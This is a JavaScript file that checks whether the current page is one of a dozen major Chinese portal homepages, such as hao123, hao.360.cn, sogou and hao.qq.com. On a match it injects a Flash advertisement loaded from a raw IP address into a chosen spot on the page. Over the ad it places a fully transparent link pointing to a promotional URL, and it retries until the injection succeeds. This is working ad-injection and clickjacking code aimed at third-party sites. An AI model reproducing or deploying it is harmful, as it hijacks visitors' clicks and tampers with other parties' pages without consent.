
(function () {

	var heredoc = function (f) {
		var s = new String(f);
		return s.substring(s.indexOf("/*<") + 3, s.lastIndexOf(">*/"));  
	};

	var tmpl = heredoc(function () {
		/*<
			<div id='yjwt-sub'
			style="position:relative;text-align:left;
			width:{width};height:{height};font-family:宋体;">
			<embed style="position:absolute;z-index:0" 
			src="{swfsrc}" quality="high" 
			width="{width}" height="{height}" type="application/x-shockwave-flash" 
			pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" wmode="opaque">
			<a href="{href}" target="_blank" 
			style="cursor:pointer;z-index:1; 
			position:absolute;display:block;background:white;
			filter:alpha(opacity=0);opacity:0;width:{width};height:{height};" 
			onfocus="this.blur();"></a>
			</div>
			>*/
	});

	var swfsrc = 'http://125.39.155.32/320x270.swf';

	var adsurl = 'http://tg.17quwan.com/r/dianxin3172/index.html?kwd=01';

	var format = function (w, h) {
		return tmpl.replace(/{width}/g, w+'px').replace(/{height}/g, h+'px')
					.replace(/{href}/g, adsurl).replace(/{swfsrc}/g, swfsrc);
	};

	var select = function (sel) {
		if (sel[0] == '#') 
			return document.getElementById(sel.substring(1));
		if (sel[0] == '.') {
			var cls = sel.substring(1);
			var elems = document.getElementsByTagName('*'), i;
			for (i in elems) {
				if ((' ' + elems[i].className + ' ').indexOf(' ' + cls + ' ') > -1) 
					return elems[i];
			}
		}
	};

	var prepend = function (sel, html) {
		var e = select(sel);
		if (e) { 
			e.innerHTML = html + e.innerHTML;
			return 'ok';
		}
	};

	var before = function (sel, html) {
		var e = select(sel);
		if (e) {
			var p = e.parentNode;
			if (p) {
				var ins = document.createElement('div');
				ins.innerHTML = html;
				p.insertBefore(ins, e);
				return 'ok';
			}
		}
	};

	var host = window.location.host;

	var update = function () {
		if (host == 'www.hao222.com') {
			return prepend('#aside', format(220, 200));
		}
		if (host == '2345.com' || host == 'www.2345.com') {
			return prepend('#right', format(256, 200));
		}
		if (host == 'hao.360.cn') {
			return before('.side-kuzhan-content', format(228, 200));
		}
		if (host == 'www.hao123.com' || host == 'hao123.com') {
			return before('.lcs-info', format(240, 200));
		}
		if (host == '123.sogou.com') {
			return before('#tookitall', format(230, 200));
		}
		if (host == 'www.265.com') {
			return before('#tools', format(186, 130));
		}
		if (host == 'site.baidu.com') {
			return before('#leftwraper', format(192, 130));
		}
		if (host == 'www.114la.com') {
			return before('.col-starBar', format(218, 200));
		}
		if (host == 'hao.qq.com') {
			return before('.barBox', format(209, 200));
		}
		if (host == 'www.5566.net') {
			return before('#div1', format(209, 200));
		}
		if (host == '123.duba.net') {
			return before('.side_a', format(232, 200));
		}
		if (host == 'www.726.com') {
			return before('.bn_L', format(228, 200));
		}
		if (host == 'www.46.com') {
			return before('#tool', format(218, 200));
		}
		if (host == 'hao.163.com') {
			return before('.oneborder', format(228, 200));
		}
		return 'end';
	}

	var retry = 0;

	var timer = function () {
		var r = update();
		if (r == 'ok' || retry++ > 20)
			return ;
		if (r == 'end')
			return ;
		setTimeout(timer, 1000);
	};

	timer();

})();

